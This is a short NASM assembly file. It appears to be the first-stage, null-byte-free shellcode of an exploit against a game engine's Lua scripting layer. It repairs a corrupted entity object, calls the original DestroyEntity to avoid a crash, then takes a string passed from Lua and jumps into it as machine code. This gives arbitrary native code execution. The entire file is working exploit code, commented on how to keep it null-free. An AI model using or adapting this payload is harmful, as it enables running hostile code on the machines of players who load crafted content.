%include 'globals.inc'

bits 32
section text
org loaderBase

;must be null free!
stage0: 
        ; restore entity obj
		;mov dword [ecx], (1 << 31) | 76E3CCh ;CSettler (CU_Sheep)
		mov dword [ecx], (1 << 31) | 783E74h ;CGLEEntity (XD_Plant1)
		shl dword [ecx], 1
		shr dword [ecx], 1
		push eax
		xor [esp], eax
		call 57A65Eh			    ; call original DestroyEntity()
		
		pushad
		
		push 2
		mov ebx, [esp+48]           ; lua_state, save in ebx for next stages
		push ebx
		mov eax, (1 << 31) | lua_tostring
		shl eax, 1
		shr eax, 1
		call [eax]
		add esp, 8
		
		call eax
				
        popad
		retn 4                       ; this turns into C4 04 00, 
                                     ; thus violating null-free, 
                                     ; but strings get an extra \0 at the end anyway ;)